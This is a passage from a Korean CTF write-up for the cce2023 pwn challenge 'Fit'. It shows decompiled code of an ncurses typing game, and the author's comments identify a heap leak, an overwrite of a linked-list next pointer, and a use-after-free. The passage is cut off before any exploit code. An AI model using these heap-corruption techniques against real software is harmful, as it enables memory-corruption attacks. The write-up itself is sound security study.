<code>cce2023{c306445363ca0d34c2fd4ba6e2da5ea19052ae855d00b3b46bc71785d16db14542d944d41934e2bcdab0816a154a8872b1258334cbc2f2672004db5a}</code></p>
<h1 id="fit">Fit<a hidden class="anchor" aria-hidden="true" href="#fit">#</a></h1>
<p>이건 대회끝나고 보니까 솔버나왔길래 궁금해서 풀어봤다.</p>
<h2 id="analysis-2">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-2">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(<span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">srand</span>(v3);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">initscr</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">raw</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">curs_set</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">resizeterm</span>(<span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">80</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cbreak</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">keypad</span>(stdscr, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">noecho</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">go</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">endwin</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">echo</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ncurses 냄새가 난다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  v11 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">clock_gettime</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>tp);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">clock_gettime</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>v6);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(rand_char, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(rand_char));
</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(input_, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(input_));
</span></span><span style="display:flex;"><span>  v10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  stage_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">get_rand_char_20</span>(rand_char);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">render_screen</span>(<span style="color:#ae81ff">1u</span>, <span style="color:#ae81ff">0</span>, rand_char, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)input_);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">wgetch</span>(stdscr);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">goto</span> LABEL_18;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( (v4 <span style="color:#f92672">&lt;=</span> <span style="color:#e6db74">&#39;@&#39;</span> <span style="color:#f92672">||</span> v4 <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> (v4 <span style="color:#f92672">&lt;=</span> <span style="color:#e6db74">&#39;`&#39;</span> <span style="color:#f92672">||</span> v4 <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#39;z&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> (v4 <span style="color:#f92672">&lt;=</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">||</span> v4 <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#39;9&#39;</span>) )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">19</span> )
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)input_ <span style="color:#f92672">+</span> v3<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> v4;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x107</span> )
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">--</span>v3;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)input_ <span style="color:#f92672">+</span> v3) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wclear</span>(qword_5250);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x157</span> <span style="color:#f92672">&amp;&amp;</span> v4 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span> );        <span style="color:#75715e">// get_by_line
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>LABEL_18:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">343</span> <span style="color:#f92672">||</span> v4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>LABEL_24:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">get_time</span>(<span style="color:#f92672">&amp;</span>v6);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">render_screen</span>(stage_, <span style="color:#a6e22e">LODWORD</span>(v6.tv_sec) <span style="color:#f92672">-</span> <span style="color:#a6e22e">LODWORD</span>(tp.tv_sec), rand_char, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)input_);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">memcmp</span>(input_, rand_char, <span style="color:#ae81ff">20uLL</span>) )       <span style="color:#75715e">// not correct -&gt; go input again
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  {
</span></span><span style="display:flex;"><span>LABEL_23:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wclear</span>(qword_5250);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(input_, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">20uLL</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_24;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">++</span>stage_ <span style="color:#f92672">!=</span> <span style="color:#ae81ff">6</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">get_rand_char_20</span>(rand_char);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_23;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">clock_gettime</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>v6);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>game_struct <span style="color:#f92672">=</span> v6.tv_sec <span style="color:#f92672">-</span> tp.tv_sec;         <span style="color:#75715e">// time
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( v6.tv_nsec <span style="color:#f92672">&gt;=</span> tp.tv_nsec )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    game_struct[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> v6.tv_nsec <span style="color:#f92672">-</span> tp.tv_nsec;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--*</span>game_struct;
</span></span><span style="display:flex;"><span>    game_struct[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> v6.tv_nsec <span style="color:#f92672">+</span> <span style="color:#ae81ff">1000000000</span> <span style="color:#f92672">-</span> tp.tv_nsec;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v11 <span style="color:#f92672">-</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>랜덤으로 문자열 뽑아서 입력된 문자열과 비교한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>_BOOL8 <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">retry_</span>(<span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>game_struct)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp+14h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _QWORD <span style="color:#f92672">*</span>v4; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">register_game_result</span>(game_struct);            <span style="color:#75715e">// heap leak next node pointer leak vulnerabililty
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">wclear</span>(stdscr);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wborder</span>(
</span></span><span style="display:flex;"><span>    stdscr,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_5200,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_5200,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_51E4,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_51E4,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0LL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0LL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0LL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">38</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;Record&#34;</span>);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)start_res_block[<span style="color:#ae81ff">5</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;%d.&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v4 )                                   <span style="color:#75715e">// block + 0x28 -&gt; 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">11</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);    <span style="color:#75715e">// heap leak vuln trigger 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">52</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;%ld.%ld&#34;</span>, <span style="color:#f92672">*</span>v4, v4[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)v4[<span style="color:#ae81ff">5</span>];                     <span style="color:#75715e">// AAR ? next pointer can be overflowed 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">34</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">echo</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;Retry(y/N)?&#34;</span>);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">wgetch</span>(stdscr);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">noecho</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v3 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;y&#39;</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>한판 끝나고 결과 저장해주고, 더 할건지 묻는다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">37</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;Result&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">30</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;Passed Time: %ld.%ld&#34;</span>, <span style="color:#f92672">*</span>game_struct, game_struct[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">20</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;Name: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wrefresh</span>(stdscr);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">echo</span>();
</span></span><span style="display:flex;"><span>    game_res_struct_malloc <span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x30uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>game_res_struct_malloc <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>game_struct;
</span></span><span style="display:flex;"><span>    game_res_struct_malloc[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> game_struct[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    game_res_struct_malloc[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, game_res_struct_malloc <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x20uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">noecho</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( current_res_block )
</span></span><span style="display:flex;"><span>      current_res_block[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)game_res_struct_malloc;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      start_res_block[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> game_res_struct_malloc;
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)game_res_struct_malloc;
</span></span><span style="display:flex;"><span>    current_res_block <span style="color:#f92672">=</span> game_res_struct_malloc;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이름을 기록한다.
singly linked list로 저장한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">20</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;Name index: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wrefresh</span>(stdscr);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">echo</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">scanw</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wclear</span>(stdscr);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wborder</span>(
</span></span><span style="display:flex;"><span>    stdscr,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_5200,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_5200,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_51E4,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_51E4,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0LL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0LL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0LL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">noecho</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">20</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;Name: &#34;</span>);	
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wrefresh</span>(stdscr);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">echo</span>();
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, NAME, <span style="color:#ae81ff">0x14uLL</span>);
</span></span><span style="display:flex;"><span>  NAME[v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">noecho</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> idx; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> v7 <span style="color:#f92672">-</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> v4;
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>)v4[<span style="color:#ae81ff">5</span>];                      <span style="color:#75715e">// next ptr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v4 )                                     <span style="color:#75715e">// if exists
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(v4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, NAME, <span style="color:#ae81ff">0x14uLL</span>);              <span style="color:#75715e">// name rewriting? AAW trigger?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">puts</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v5 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);              <span style="color:#75715e">// print_name? 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v7 <span style="color:#f92672">-</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>게임 끝나고 &lsquo;y&rsquo;가 아니라면 실행되는 함수다.
idx 받고 이름 다시 써준다.</p>
<h2 id="exploitation-2">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation-2">#</a></h2>
<p>취약점은 대놓고 주는데, 익스가 오래걸렸다.
I/O가 이상해서 pyte 터미널 에뮬레이터를 활용했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    game_res_struct_malloc <span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x30uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>game_res_struct_malloc <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>game_struct;
</span></span><span style="display:flex;"><span>    game_res_struct_malloc[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> game_struct[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    game_res_struct_malloc[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, game_res_struct_malloc <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x20uLL</span>);
</span></span></code></pre></div><p>경계 체크가 미흡해서 다음 노드를 가리키는 포인터를 덮을 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#a6e22e">echo</span>();
</span></span><span style="display:flex;"><span>    game_res_struct_malloc <span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x30uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>game_res_struct_malloc <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>game_struct;
</span></span></code></pre></div><p>초기화가 하지 않아서 UAF를 트리거할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">38</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;Record&#34;</span>);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)start_res_block[<span style="color:#ae81ff">5</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;%d.&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v4 )                                   <span style="color:#75715e">// block + 0x28 -&gt; 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
